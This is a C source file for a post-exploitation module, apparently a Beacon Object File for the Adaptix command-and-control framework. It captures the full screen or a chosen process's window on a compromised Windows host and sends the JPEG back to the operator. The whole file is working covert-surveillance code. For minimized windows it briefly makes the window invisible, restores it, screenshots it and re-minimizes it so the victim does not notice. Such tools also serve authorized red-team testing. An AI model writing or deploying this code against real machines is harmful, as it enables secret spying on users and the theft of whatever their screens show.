#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <gdiplus.h>
#include "adaptix.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "gdiplus.lib")

DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteDC(HDC hdc);
DECLSPEC_IMPORT HDC     WINAPI USER32$GetDC(HWND hWnd);
DECLSPEC_IMPORT int     WINAPI USER32$ReleaseDC(HWND hWnd, HDC hdc);
DECLSPEC_IMPORT HDC     WINAPI GDI32$CreateCompatibleDC(HDC hdc);
DECLSPEC_IMPORT HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC hdc, int nWidth, int nHeight);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$SelectObject(HDC hdc, HGDIOBJ hgdiobj);
DECLSPEC_IMPORT BOOL    WINAPI USER32$PrintWindow(HWND hwnd, HDC hdcBlt, UINT nFlags);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$BitBlt(HDC hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, HDC hdcSrc, int nXSrc, int nYSrc, DWORD dwRop);
DECLSPEC_IMPORT BOOL    WINAPI USER32$ShowWindow(HWND hWnd, int nCmdShow);
DECLSPEC_IMPORT LONG    WINAPI USER32$SetWindowLongA(HWND hWnd, int nIndex, LONG dwNewLong);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CreateStreamOnHGlobal(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetLayeredWindowAttributes(HWND hWnd, COLORREF crKey, BYTE bAlpha, DWORD dwFlags);
DECLSPEC_IMPORT BOOL    WINAPI USER32$UpdateWindow(HWND hWnd);
DECLSPEC_IMPORT VOID    WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT BOOL    WINAPI USER32$GetWindowRect(HWND hWnd, LPRECT lpRect);
DECLSPEC_IMPORT BOOL    WINAPI USER32$GetWindowPlacement(HWND hWnd, WINDOWPLACEMENT* lpwndpl);
DECLSPEC_IMPORT DWORD   WINAPI USER32$GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
DECLSPEC_IMPORT BOOL    WINAPI USER32$EnumWindows(WNDENUMPROC lpEnumFunc, LPARAM lParam);
DECLSPEC_IMPORT int     WINAPI USER32$GetSystemMetrics(int nIndex);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetWindowPos(HWND hWnd, HWND hWndInsertAfter, int X, int Y, int cx, int cy, UINT uFlags);
DECLSPEC_IMPORT BOOL    WINAPI USER32$IsWindowVisible(HWND hWnd);
DECLSPEC_IMPORT LONG    WINAPI USER32$GetWindowLongA(HWND hWnd, int nIndex);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteObject(HGDIOBJ hObject);
DECLSPEC_IMPORT BOOL    WINAPI User32$SetProcessDPIAware();
WINBASEAPI DWORD        WINAPI KERNEL32$GetLastError(VOID);

DECLSPEC_IMPORT WINBASEAPI void* MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT WINBASEAPI void  MSVCRT$free(void *_Memory);

DECLSPEC_IMPORT GpStatus WINAPI GDIPLUS$GdiplusStartup(ULONG_PTR* pToken, const GdiplusStartupInput* pInput, GdiplusStartupOutput* pOutput);
DECLSPEC_IMPORT VOID   WINAPI GDIPLUS$GdiplusShutdown(ULONG_PTR token);
DECLSPEC_IMPORT GpStatus WINAPI GDIPLUS$GdipCreateBitmapFromHBITMAP(HBITMAP hBitmap, HPALETTE hPalette, GpBitmap** ppBitmap);
DECLSPEC_IMPORT GpStatus WINAPI GDIPLUS$GdipDisposeImage(GpImage* image);
DECLSPEC_IMPORT GpStatus WINAPI GDIPLUS$GdipSaveImageToStream(GpImage* image, IStream* stream, const CLSID* clsidEncoder, const EncoderParameters* encoderParams);

BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize) {
    GdiplusStartupInput gdiplusInput = { 0 };
    gdiplusInput.GdiplusVersion = 1;

    ULONG_PTR token;
    if (GDIPLUS$GdiplusStartup(&token, &gdiplusInput, NULL) != Ok) return FALSE;

    GpBitmap* bmp = NULL;
    if (GDIPLUS$GdipCreateBitmapFromHBITMAP(hBitmap, NULL, &bmp) != Ok) {
        GDIPLUS$GdiplusShutdown(token);
        return FALSE;
    }

    IStream* stream = NULL;
    if (OLE32$CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) {
        GDIPLUS$GdipDisposeImage((GpImage*)bmp);
        GDIPLUS$GdiplusShutdown(token);
        return FALSE;
    }

    EncoderParameters params;
    params.Count = 1;
    CLSID clsidEncoderQuality = { 0x1d5be4b5, 0xfa4a, 0x452d, {0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb} };
    params.Parameter[0].Guid = clsidEncoderQuality;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].Value = &quality;

    CLSID clsidJPEG = { 0x557cf401, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };
    if (GDIPLUS$GdipSaveImageToStream((GpImage*)bmp, stream, &clsidJPEG, &params) != Ok) {
        stream->lpVtbl->Release(stream);
        GDIPLUS$GdipDisposeImage((GpImage*)bmp);
        GDIPLUS$GdiplusShutdown(token);
        return FALSE;
    }

    ULARGE_INTEGER ulSize;
    LARGE_INTEGER liZero = {0};
    stream->lpVtbl->Seek(stream, liZero, STREAM_SEEK_END, &ulSize);
    *pJpegSize = (DWORD)ulSize.QuadPart;

    *pJpegData = (BYTE*)MSVCRT$malloc(*pJpegSize);
    if (!*pJpegData) {
        stream->lpVtbl->Release(stream);
        GDIPLUS$GdipDisposeImage((GpImage*)bmp);
        GDIPLUS$GdiplusShutdown(token);
        return FALSE;
    }

    stream->lpVtbl->Seek(stream, liZero, STREAM_SEEK_SET, NULL);
    ULONG bytesRead = 0;
    stream->lpVtbl->Read(stream, *pJpegData, *pJpegSize, &bytesRead);

    stream->lpVtbl->Release(stream);
    GDIPLUS$GdipDisposeImage((GpImage*)bmp);
    GDIPLUS$GdiplusShutdown(token);

    return (bytesRead == *pJpegSize);
}

BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR note) {
    BYTE* data;
    DWORD size;
    if (!BitmapToJpeg(hBitmap, 90, &data, &size)) return FALSE;
    AxAddScreenshot((char*)note, (char*)data, (int)size);
    MSVCRT$free(data);
    return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    struct EnumData {
        DWORD pid;
        HWND hwnd;
    };

    struct EnumData* data = (struct EnumData*)lParam;
    DWORD windowPid = 0;
    USER32$GetWindowThreadProcessId(hwnd, &windowPid);

    if (windowPid == data->pid && USER32$IsWindowVisible(hwnd)) {
        data->hwnd = hwnd;
        return FALSE;
    }
    return TRUE;
}

HWND FindWindowByPID(DWORD pid) {
    struct EnumData {
        DWORD pid;
        HWND hwnd;
    } data = { pid, NULL };

    USER32$EnumWindows(EnumWindowsProc, (LPARAM)&data);
    return data.hwnd;
}

HBITMAP CaptureWindow(HWND hwnd) {
    WINDOWPLACEMENT wp = { sizeof(wp) };
    if (!USER32$GetWindowPlacement(hwnd, &wp)) {
        BeaconPrintf(CALLBACK_ERROR, "GetWindowPlacement failed");
        return NULL;
    }

    RECT captureRect;
    int width, height;
    BOOL success = FALSE;
    HDC hdcScreen = USER32$GetDC(NULL);
    HDC hdcMem = GDI32$CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = NULL;

    if (wp.showCmd == SW_SHOWMINIMIZED) {
        LONG exStyle = USER32$GetWindowLongA(hwnd, GWL_EXSTYLE);
        USER32$SetWindowLongA(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
        USER32$SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
        USER32$ShowWindow(hwnd, SW_RESTORE);
        USER32$UpdateWindow(hwnd);
        KERNEL32$Sleep(1000);  /* Allow time for rendering */

        if (!USER32$GetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "GetWindowRect failed (restored window)");
            goto cleanup;
        }

        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "Invalid window dimensions SW_SHOWMINIMIZED");
            goto cleanup;
        }
        hBitmap = GDI32$CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create compatible bitmap");
            goto cleanup;
        }
        GDI32$SelectObject(hdcMem, hBitmap);
        success = USER32$PrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            success = GDI32$BitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "Both PrintWindow and BitBlt failed");
        }

        USER32$ShowWindow(hwnd, SW_MINIMIZE);
        USER32$SetWindowLongA(hwnd, GWL_EXSTYLE, exStyle);
        USER32$SetWindowPos(hwnd, NULL, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    } else {
        if (!USER32$GetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "GetWindowRect failed");
            goto cleanup;
        }

        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "Invalid window dimensions ");
            goto cleanup;
        }
        hBitmap = GDI32$CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create compatible bitmap");
            goto cleanup;
        }
        GDI32$SelectObject(hdcMem, hBitmap);

        success = USER32$PrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            success = GDI32$BitBlt(hdcMem, 0, 0, width, height, hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "Both PrintWindow and BitBlt failed");
        }
    }

cleanup:
    if (hdcMem)
        GDI32$DeleteDC(hdcMem);
    if (hdcScreen)
        USER32$ReleaseDC(NULL, hdcScreen);
    if (!success) {
        if (hBitmap)
            GDI32$DeleteObject(hBitmap);
        return NULL;
    }
    return hBitmap;
}


void go(char* buff, int len) {
    datap parser;
    BeaconDataParse(&parser, buff, len);
    char* note = BeaconDataExtract(&parser, NULL);
    int pid    = BeaconDataInt(&parser);

    User32$SetProcessDPIAware();

    HBITMAP bmp = NULL;
    if (pid != 0) {
        HWND hwnd = FindWindowByPID((DWORD)pid);
        if (!hwnd) {
            BeaconPrintf(CALLBACK_ERROR, "Window with PID %d not found", pid);
            return;
        }
        bmp = CaptureWindow(hwnd);
        if (!bmp) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to capture window with PID %d", pid);
            return;
        }
    } else {
        int x = USER32$GetSystemMetrics(SM_XVIRTUALSCREEN);
        int y = USER32$GetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = USER32$GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = USER32$GetSystemMetrics(SM_CYVIRTUALSCREEN);

        HDC screenDC = USER32$GetDC(NULL);
        if (screenDC == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "GetDC(NULL) returned NULL. Error: %lu", KERNEL32$GetLastError());
            return;
        }

        HDC memDC = GDI32$CreateCompatibleDC(screenDC);
        if (memDC == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "CreateCompatibleDC failed. Error: %lu", KERNEL32$GetLastError());
            USER32$ReleaseDC(NULL, screenDC);
            return;
        }

        bmp = GDI32$CreateCompatibleBitmap(screenDC, w, h);
        if (bmp == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create full screen bitmap");
            GDI32$DeleteDC(memDC);
            USER32$ReleaseDC(NULL, screenDC);
            return;
        }

        GDI32$SelectObject(memDC, bmp);
        if (!GDI32$BitBlt(memDC, 0, 0, w, h, screenDC, x, y, SRCCOPY)) {
            BeaconPrintf(CALLBACK_ERROR, "Full screen BitBlt failed: %lu", KERNEL32$GetLastError());
        }
        GDI32$DeleteDC(memDC);
        USER32$ReleaseDC(NULL, screenDC);
    }

    if (bmp) {
        if (!SaveHBITMAPToFile(bmp, note)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to save JPEG");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved successfully");
        }
        GDI32$DeleteObject(bmp);
    }
}